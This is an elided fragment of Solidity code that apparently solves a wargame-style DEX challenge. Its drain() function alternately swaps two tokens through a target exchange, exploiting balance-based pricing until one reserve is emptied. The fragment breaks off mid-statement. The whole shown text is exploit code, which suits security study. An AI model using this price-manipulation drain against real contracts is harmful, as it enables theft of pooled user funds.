...
contract Dex {
    ...
    // use this after approving the token to the contract
    function drain() public {
        ...
        address a = token1;
        address b = token2;
        uint256 amount = dexInstance.balanceOf(a, address(this));
        while (dexInstance.getSwapPrice(a, b, amount) <= dexInstance.balanceOf(b, address(dexInstance))) {
            dexInstance.swap(a, b, amount);
            a = a == token1 ? token2 : token1;
            b = b == token1 ? token2 : token1;
            amount = dexInstance.balanceOf(a, address(this));
        }
        dexInstance.swap(a, b, calculateLastAmount(a, b));
        require(
            dexInstance.balanceOf(token1, address(dexInstance)) == 0
                || dexInstance.balanceOf(token2, address(dexInstance)) == 0,
